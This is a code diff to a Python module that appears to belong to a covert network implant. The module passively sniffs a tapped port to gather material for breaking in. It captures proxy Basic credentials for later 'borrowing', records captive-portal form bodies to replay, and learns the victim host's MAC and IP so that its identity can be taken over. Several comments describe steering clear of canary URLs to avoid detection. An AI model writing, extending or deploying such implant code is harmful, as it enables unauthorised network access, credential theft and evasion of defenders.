@@ -33,6 +33,7 @@ look like an IP phone.
 
 import base64
 import binascii
+import collections
 import logging
 from typing import Dict, List, Optional
 
@@ -82,11 +83,49 @@ _TLS_EXT_SERVER_NAME = 0x0000
 
 _NOT_A_SENDER = ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff")
 
+# ── bounds, because this runs for as long as the implant is dark ──
+#
+# The design's own worst case for an outage is a week, on a 4 GB device
+# that is bridging and running the sniffer's capture at the same time.
+# Every container below used to grow without a ceiling, and a review
+# measured 400 MB of resident memory from 40,000 frames of ordinary
+# traffic -- most of it unanswered DNS queries and unanswered ClientHellos
+# that nothing ever expired. The OOM killer would then have taken the
+# scout, the sniffer or the beacon.
+#
+# `MAX_ENTRIES` caps what is published: the first N distinct things seen,
+# because the *first* resolver and the *first* proxy a host used are the
+# ones a rung wants, and a flood arriving later must not push them out.
+# `MAX_PENDING` caps what is waiting for an answer, and that one evicts
+# oldest-first: a query from ten minutes ago is not going to be answered.
+MAX_ENTRIES = 256
+MAX_PENDING = 2048
+
+# A captive portal's form, as a body this will replay. Capped because a
+# frame can carry 64 KB and the rung sends it verbatim.
+MAX_PORTAL_BODY = 4096
+
+# Where a captive portal can be. It is on the network the host is being
+# held off, so a redirect to a public address is not a portal -- it is a
+# frame pointing the implant at somebody's canary URL. Checked by prefix
+# rather than with `ipaddress`, which `beacon.py` cannot have and this
+# file keeps in step with by hand.
+_PRIVATE_PREFIXES = ("10.", "192.168.", "169.254.", "127.")
+
 
 class Evidence(object):
     """One stuck window's reading of the tapped port."""
 
-    def __init__(self):
+    def __init__(self, own_mac=None):
+        # This implant's own address on the bridge, so its own traffic is
+        # not mistaken for the host's. The scout sniffs `br0`, which
+        # carries the beacon's own queries and its own TLS -- so without
+        # this the document and the model's prompt could describe the
+        # implant to itself, and the trail would name the implant as the
+        # identity rung 4 would take. `None` on a host where it cannot be
+        # read, which is the old behaviour and is still better than
+        # refusing to collect anything.
+        self.own_mac = (own_mac or "").strip().lower() or None
         self.dot1x_seen = False
         self.portal_answered = False
         self.resolvers = {}             # type: Dict[str, int]
@@ -100,15 +139,25 @@ class Evidence(object):
         self.host_ip = None             # type: Optional[str]
         # Queries waiting for an answer, keyed by (resolver, id): a
         # resolver counts only once it has answered one, because "does this
-        # resolver answer" is the question the rung needs settled.
-        self._dns_pending = set()
+        # resolver answer" is the question the rung needs settled. Ordered
+        # and bounded, so the oldest unanswered query is the one evicted.
+        self._dns_pending = collections.OrderedDict()
+        # The proxies that have answered a 407 on a CONNECT. A credential
+        # is recorded only for one of these: a `Proxy-Authorization`
+        # header is one frame anybody on the segment can send, and the
+        # borrow rung answers a *refusal*, so the refusal has to have
+        # happened. Keyed by `host:port`.
+        self._refused_by = set()
+        # CONNECTs waiting for their answer, so a 407 can be attributed to
+        # the proxy the host was really talking to.
+        self._connect_pending = collections.OrderedDict()
         # ClientHellos waiting for a ServerHello, keyed by the reverse flow
         # tuple -- the key the server's packet will have.
-        self._tls_pending = {}          # type: Dict[tuple, str]
+        self._tls_pending = collections.OrderedDict()
         # The portal noticed, and the request to it that is waiting to be
         # called answered.
         self._portal_host = None        # type: Optional[str]
-        self._portal_pending = {}       # type: Dict[tuple, dict]
+        self._portal_pending = collections.OrderedDict()
 
     # ── the one entry point ──
 
@@ -177,7 +226,7 @@ class Evidence(object):
         key = (resolver, int(dns.id))
         if not int(dns.qr):
             self._note_identity(packet)
-            self._dns_pending.add(key)
+            _remember(self._dns_pending, key, True)
             self._note_wpad(dns)
             return
         # An answer, and only one with an answer section: a REFUSED or a
@@ -190,13 +239,16 @@ class Evidence(object):
         # -- `[]` -- on both a constructed and a parsed refusal.
         if key not in self._dns_pending or not dns.an:
             return
-        self._dns_pending.discard(key)
+        self._dns_pending.pop(key, None)
+        if (resolver not in self.resolvers
+                and len(self.resolvers) >= MAX_ENTRIES):
+            return
         self.resolvers[resolver] = self.resolvers.get(resolver, 0) + 1
 
     def _note_wpad(self, dns) -> None:
         name = _qname(dns)
-        if name and name.split(".", 1)[0] == "wpad" and name not in self.wpad:
-            self.wpad.append(name)
+        if name and name.split(".", 1)[0] == "wpad":
+            _append(self.wpad, name)
 
     def _tcp(self, packet) -> None:
         payload = _payload(packet)
@@ -224,27 +276,29 @@ class Evidence(object):
         self._note_identity(packet)
         where = "%s:%d" % (packet[IP].dst, int(packet[TCP].dport))
         if method == "CONNECT":
-            if where not in self.proxies:
-                self.proxies.append(where)
-        self._note_credential(headers, where)
+            _append(self.proxies, where)
+            _remember(self._connect_pending, _reverse_flow(packet), where)
+            # Only against a CONNECT, and only to a proxy that has already
+            # refused one: see `_refused_by`.
+            self._note_credential(headers, where)
         host = headers.get("host", "")
         if method == "GET":
             self._note_pac(host, target)
         if method == "POST" and host and host == self._portal_host:
-            self._portal_pending[_reverse_flow(packet)] = {
-                "url": "http://%s%s" % (host, target),
-                "body": body.decode("utf-8", "replace"),
-                "content_type": headers.get("content-type", ""),
-            }
+            text = body.decode("utf-8", "replace")
+            if len(text) <= MAX_PORTAL_BODY:
+                _remember(self._portal_pending, _reverse_flow(packet), {
+                    "url": "http://%s%s" % (host, target),
+                    "body": text,
+                    "content_type": headers.get("content-type", ""),
+                })
 
     def _note_pac(self, host, target) -> None:
         path = target.split("?", 1)[0]
         last = path.rsplit("/", 1)[-1].lower()
         if not host or not (last.endswith(".pac") or last == "wpad.dat"):
             return
-        url = "http://%s%s" % (host, target)
-        if url not in self.pac:
-            self.pac.append(url)
+        _append(self.pac, "http://%s%s" % (host, target))
 
     def _http_response(self, packet, start, headers) -> None:
         status = _status(start)
@@ -253,8 +307,20 @@ class Evidence(object):
         flow = _flow(packet)
         if status in _REDIRECTS:
             host = _netloc(headers.get("location", ""))
-            if host:
+            # Only a portal on the network the host is being held off. A
+            # redirect to a public address is one frame anybody on the
+            # segment can send, and the rung would replay it -- which is a
+            # request to somebody else's canary URL from the one host that
+            # cannot afford to make one.
+            if host and _is_local(host):
                 self._portal_host = host
+            return
+        if status == 407:
+            # The proxy demanded authentication. That is what makes a
+            # credential on the next CONNECT worth borrowing.
+            proxy = self._connect_pending.pop(flow, None)
+            if proxy:
+                self._refused_by.add(proxy)
             return
         pending = self._portal_pending.pop(flow, None)
         if pending is not None and status in _PORTAL_ACCEPTED:
@@ -264,6 +330,12 @@ class Evidence(object):
             self.portal_answered = True
 
     def _note_credential(self, headers, where) -> None:
+        if where not in self._refused_by:
+            # A header on a request to a host that never answered 407 is
+            # not evidence of a credential this host needs -- it is a
+            # frame. The borrow rung answers a refusal, so the refusal is
+            # the precondition.
+            return
         value = headers.get("proxy-authorization", "")
         parts = value.split(None, 1)
         if len(parts) != 2:
@@ -288,10 +360,8 @@ class Evidence(object):
         self._add_credential("proxy-basic", user, secret, where)
 
     def _add_credential(self, kind, user, secret, where) -> None:
-        entry = {"kind": kind, "user": user, "secret": secret,
-                 "where": where}
-        if entry not in self.credentials:
-            self.credentials.append(entry)
+        _append(self.credentials, {"kind": kind, "user": user,
+                                   "secret": secret, "where": where})
 
     # ── TLS ──
 
@@ -301,14 +371,14 @@ class Evidence(object):
             name = _sni(payload)
             if name:
                 self._note_identity(packet)
-                self._tls_pending[_reverse_flow(packet)] = name
+                _remember(self._tls_pending, _reverse_flow(packet), name)
         elif kind == _TLS_SERVER_HELLO:
             name = self._tls_pending.pop(_flow(packet), None)
-            if name and name not in self.tls_destinations:
+            if name:
                 # Only now. "The host proves this works" is the whole value
                 # of this line, and a ClientHello nobody answered proves
                 # the opposite.
-                self.tls_destinations.append(name)
+                _append(self.tls_destinations, name)
 
     # ── identity ──
 
@@ -325,6 +395,8 @@ class Evidence(object):
             return
         mac = str(packet[Ether].src or "").lower()
         if not mac or mac in _NOT_A_SENDER or _is_multicast(mac):
+            return
+        if self.own_mac and mac == self.own_mac:
             return
         self.host_mac = mac
         self.host_ip = str(packet[IP].src)
@@ -456,6 +528,55 @@ def _server_name(body: bytes):
     if len(name) < size or not name:
         return None
     return name.decode("utf-8", "replace").rstrip(".").lower()
+
+
+def _append(sequence: list, item) -> None:
+    """Add `item` once, up to `MAX_ENTRIES`. See the bounds above.
+
+    The *first* N and not the last: the first resolver and the first proxy
+    a host used are the ones a rung wants, and a flood arriving later must
+    not be able to push them out.
+    """
+    if item in sequence or len(sequence) >= MAX_ENTRIES:
+        return
+    sequence.append(item)
+
+
+def _remember(pending, key, value) -> None:
+    """Record something waiting for an answer, oldest evicted first.
+
+    The opposite policy from `_append`, and deliberately: a query from ten
+    minutes ago is not going to be answered, so the newest are the ones
+    worth keeping room for.
+    """
+    pending[key] = value
+    pending.move_to_end(key)
+    while len(pending) > MAX_PENDING:
+        pending.popitem(last=False)
+
+
+def _is_local(host: str) -> bool:
+    """Whether a redirect's host could be a captive portal on this network.
+
+    A portal is on the network the host is being held off. A name is
+    allowed -- a portal usually has one, and this implant cannot resolve
+    it to check -- but a public address is not: that is a frame pointing
+    the implant at somebody else's URL.
+    """
+    name = host.split(":", 1)[0].strip().lower().rstrip(".")
+    if not name:
+        return False
+    parts = name.split(".")
+    if not all(part.isdigit() for part in parts) or len(parts) != 4:
+        return True            # a name, not an address
+    if name.startswith(_PRIVATE_PREFIXES):
+        return True
+    if parts[0] == "172":
+        try:
+            return 16 <= int(parts[1]) <= 31
+        except ValueError:
+            return False
+    return False
 
 
 def _is_multicast(mac: str) -> bool:
